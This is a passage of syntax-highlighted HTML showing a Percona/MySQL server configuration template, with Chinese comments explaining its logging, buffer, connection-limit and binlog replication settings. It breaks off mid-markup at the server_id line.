tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Percona Server template configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e[mysqld]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Remove leading # and set to the amount of RAM for the most important data\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# cache in MySQL. Start at 70% of total RAM for dedicated server, else 10%.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# innodb_buffer_pool_size = 128M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Remove leading # to turn on a very important data integrity option: logging\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# changes to the binary log between backups.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# log_bin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Remove leading # to set options mainly useful for reporting servers.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# The server defaults are faster for transactions and fast SELECTs.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Adjust sizes as needed, experiment to find the optimal values.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# join_buffer_size = 128M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# sort_buffer_size = 2M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# read_rnd_buffer_size = 2M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eport\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e3306\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003edatadir\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/data/mysql\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003esocket\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/data/mysql/mysql.sock\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003epid_file\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/data/mysql/mysqld.pid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 服务端编码\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003echaracter_set_server\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eutf8mb4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 服务端排序\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ecollation_server\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eutf8mb4_general_ci\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 强制使用 utf8mb4 编码集，忽略客户端设置\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eskip_character_set_client_handshake\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 日志输出到文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog_output\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eFILE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 开启常规日志输出\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003egeneral_log\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 常规日志输出文件位置\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003egeneral_log_file\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/var/log/mysql/mysqld.log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 错误日志位置\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog_error\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/var/log/mysql/mysqld-error.log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 记录慢查询\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eslow_query_log\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 慢查询时间(大于 1s 被视为慢查询)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elong_query_time\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 慢查询日志文件位置\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eslow_query_log_file\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/var/log/mysql/mysqld-slow.log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 临时文件位置\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003etmpdir\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/data/mysql_tmp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 线程池缓存(refs https://my.oschina.net/realfighter/blog/363853)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ethread_cache_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e30\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# The number of open tables for all threads.(refs https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_table_open_cache)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003etable_open_cache\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e16384\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 文件描述符(此处修改不生效，请修改 systemd service 配置)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://www.percona.com/blog/2017/10/12/open_files_limit-mystery/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://www.cnblogs.com/wxxjianchi/p/10370419.html\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#open_files_limit=65535\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 表定义缓存(5.7 以后自动调整)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://dev.mysql.com/doc/refman/5.6/en/server-system-variables.html#sysvar_table_definition_cache\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs http://mysql.taobao.org/monthly/2015/08/10/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#table_definition_cache=16384\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003esort_buffer_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ejoin_buffer_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# MyiSAM 引擎专用(内部临时磁盘表可能会用)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eread_buffer_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eread_rnd_buffer_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# MyiSAM 引擎专用(内部临时磁盘表可能会用)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ekey_buffer_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e32M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# MyiSAM 引擎专用(内部临时磁盘表可能会用)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ebulk_insert_buffer_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e16M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# myisam_sort_buffer_size 与 sort_buffer_size 区别请参考(https://stackoverflow.com/questions/7871027/myisam-sort-buffer-size-vs-sort-buffer-size)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emyisam_sort_buffer_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e64M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 内部内存临时表大小\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003etmp_table_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e32M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 用户创建的 MEMORY 表最大大小(tmp_table_size 受此值影响)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax_heap_table_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e32M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 开启查询缓存\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003equery_cache_type\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查询缓存大小\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003equery_cache_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e32M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# sql mode\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003esql_mode\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e########### Network ###########\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 最大连接数(该参数受到最大文件描述符影响，如果不生效请检查最大文件描述符设置)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://stackoverflow.com/questions/39976756/the-max-connections-in-mysql-5-7\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax_connections\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1500\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# mysql 堆栈内暂存的链接数量\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 当短时间内链接数量超过 max_connections 时，部分链接会存储在堆栈内，存储数量受此参数控制\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eback_log\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e256\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 最大链接错误，针对于 client 主机，超过此数量的链接错误将会导致 mysql server 针对此主机执行锁定(禁止链接 ERROR 1129 )\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 此错误计数仅在 mysql 链接握手失败才会计算，一般出现问题时都是网络故障\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://www.cnblogs.com/kerrycode/p/8405862.html\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax_connect_errors\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e100000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# mysql server 允许的最大数据包大小\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax_allowed_packet\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e64M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 交互式客户端链接超时(30分钟自动断开)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einteractive_timeout\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1800\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 非交互式链接超时时间(10分钟)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 如果客户端有连接池，则需要协商此参数(refs https://database.51cto.com/art/201909/603519.htm)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ewait_timeout\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e600\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 跳过外部文件系统锁定\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# If you run multiple servers that use the same database directory (not recommended),\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# each server must have external locking enabled.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://dev.mysql.com/doc/refman/5.7/en/external-locking.html\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eskip_external_locking\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 跳过链接的域名解析(开启此选项后 mysql 用户授权的 host 方式失效)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eskip_name_resolve\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 禁用主机名缓存，每次都会走 DNS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ehost_cache_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eini\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e########### REPL ###########\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 开启 binlog\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog_bin\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003emysql-bin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 作为从库时，同步信息依然写入 binlog，方便此从库再作为其他从库的主库\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog_slave_updates\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# server id，默认为 ipv4 地址去除第一段\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# eg: 172.16.10.11 =\u0026gt; 161011\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eserver_id\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan 